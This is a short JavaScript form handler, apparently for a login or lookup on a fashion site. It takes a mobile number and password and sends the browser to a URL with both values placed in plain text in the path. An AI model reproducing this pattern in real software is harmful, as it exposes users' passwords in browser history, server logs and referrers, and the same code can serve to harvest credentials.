document.getElementById('searchForm').addEventListener('submit', function(event) {
    event.preventDefault();
    var mobileNumber = document.getElementById('mobileNumber').value.trim();
    var password = document.getElementById('password').value.trim();
    if (mobileNumber !== '' && password !== '') {
        window.location.href = 'https://sunitafashion.com/' + mobileNumber + '/' + password;
    } else {
        alert('Please enter both mobile number and password.');
    }
});
